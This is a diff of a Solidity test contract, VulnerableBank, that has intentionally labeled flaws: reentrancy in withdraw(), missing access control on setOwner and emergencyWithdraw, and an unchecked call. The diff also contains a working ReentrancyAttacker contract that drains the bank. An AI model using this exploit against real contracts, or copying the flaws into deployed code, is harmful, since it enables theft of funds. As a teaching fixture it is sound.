@@ -2,15 +2,13 @@
 pragma solidity ^0.8.0;
 
 /**
- * @title Vulnerable Bank Contract
- * @notice ⚠️ THIS CONTRACT HAS INTENTIONAL VULNERABILITIES FOR TESTING
- * @dev DO NOT USE IN PRODUCTION
+ * @title VulnerableBank
+ * @dev Simple bank contract with intentional vulnerabilities for testing
  *
- * Known Vulnerabilities:
- * 1. SC01 - Reentrancy in withdraw()
- * 2. SC02 - Missing access control in setOwner()
- * 3. SC04 - Unchecked call return value
- * 4. SC08 - Timestamp dependence in isLucky()
+ * Known vulnerabilities:
+ * 1. Reentrancy in withdraw()
+ * 2. Integer overflow potential (Solidity <0.8.0 would have this)
+ * 3. No access control on critical functions
  */
 contract VulnerableBank {
     mapping(address => uint256) public balances;
@@ -24,7 +22,7 @@ contract VulnerableBank {
     }
 
     /**
-     * @notice Deposit funds into the bank
+     * @dev Deposit Ether into the bank
      */
     function deposit() public payable {
         require(msg.value > 0, "Must deposit positive amount");
@@ -33,111 +31,69 @@ contract VulnerableBank {
     }
 
     /**
-     * @notice Withdraw funds from the bank
-     * @dev VULNERABLE TO REENTRANCY (SC01)
-     * External call before state update allows reentrancy
+     * @dev Withdraw Ether from the bank
+     * @param amount Amount to withdraw
+     *
+     * VULNERABILITY: Reentrancy - external call before state update
      */
-    function withdraw() public {
-        uint256 balance = balances[msg.sender];
-        require(balance > 0, "Insufficient balance");
+    function withdraw(uint256 amount) public {
+        require(balances[msg.sender] >= amount, "Insufficient balance");
 
-        // VULNERABILITY: External call before state change
-        (bool success, ) = msg.sender.call{value: balance}("");
+        // VULNERABLE: External call before state update
+        (bool success, ) = msg.sender.call{value: amount}("");
         require(success, "Transfer failed");
 
-        // State change AFTER external call - reentrancy possible
-        balances[msg.sender] = 0;
-
-        emit Withdrawal(msg.sender, balance);
+        // State update after external call (should be before!)
+        balances[msg.sender] -= amount;
+        emit Withdrawal(msg.sender, amount);
     }
 
     /**
-     * @notice Change contract owner
-     * @dev VULNERABLE: MISSING ACCESS CONTROL (SC02)
-     * Anyone can call this function and become owner
+     * @dev Get contract balance
      */
-    function setOwner(address newOwner) public {
-        // VULNERABILITY: No onlyOwner modifier
-        owner = newOwner;
-    }
-
-    /**
-     * @notice Emergency withdrawal by owner
-     * @dev VULNERABLE: UNCHECKED CALL RETURN VALUE (SC04)
-     */
-    function emergencyWithdraw(address payable recipient, uint256 amount) public {
-        require(msg.sender == owner, "Only owner");
-
-        // VULNERABILITY: Return value not checked
-        recipient.call{value: amount}("");
-    }
-
-    /**
-     * @notice Check if current timestamp is "lucky"
-     * @dev VULNERABLE: TIMESTAMP DEPENDENCE (SC08)
-     * Miners can manipulate block.timestamp within ~15 seconds
-     */
-    function isLucky() public view returns (bool) {
-        // VULNERABILITY: Using block.timestamp for critical logic
-        return block.timestamp % 7 == 0;
-    }
-
-    /**
-     * @notice Get balance of user
-     */
-    function getBalance(address user) public view returns (uint256) {
-        return balances[user];
-    }
-
-    /**
-     * @notice Get contract total balance
-     */
-    function getTotalBalance() public view returns (uint256) {
+    function getBalance() public view returns (uint256) {
         return address(this).balance;
     }
 
-    receive() external payable {
-        deposit();
+    /**
+     * @dev Emergency withdrawal
+     * VULNERABILITY: No access control - anyone can drain the contract!
+     */
+    function emergencyWithdraw() public {
+        uint256 balance = address(this).balance;
+        (bool success, ) = msg.sender.call{value: balance}("");
+        require(success, "Emergency withdrawal failed");
     }
 }
 
 /**
- * @title Attacker Contract
- * @notice Demonstrates reentrancy attack
+ * @title ReentrancyAttacker
+ * @dev Example attacker contract demonstrating reentrancy vulnerability
  */
-contract Attacker {
+contract ReentrancyAttacker {
     VulnerableBank public bank;
-    uint256 public attackCount;
+    uint256 public attackAmount;
 
-    constructor(address payable _bankAddress) {
+    constructor(address _bankAddress) {
         bank = VulnerableBank(_bankAddress);
     }
 
-    /**
-     * @notice Start reentrancy attack
-     */
     function attack() public payable {
         require(msg.value > 0, "Need funds to attack");
+        attackAmount = msg.value;
 
-        // Deposit to bank
+        // Deposit first
         bank.deposit{value: msg.value}();
 
-        // Trigger reentrancy
-        bank.withdraw();
+        // Then withdraw to trigger reentrancy
+        bank.withdraw(msg.value);
     }
 
-    /**
-     * @notice Fallback function to perform reentrancy
-     */
+    // Fallback function - called during withdrawal
     receive() external payable {
-        // Reenter if bank still has funds
-        if (address(bank).balance > 0 && attackCount < 3) {
-            attackCount++;
-            bank.withdraw();
+        if (address(bank).balance >= attackAmount) {
+            // Reenter the withdraw function
+            bank.withdraw(attackAmount);
         }
-    }
-
-    function getBalance() public view returns (uint256) {
-        return address(this).balance;
     }
 }
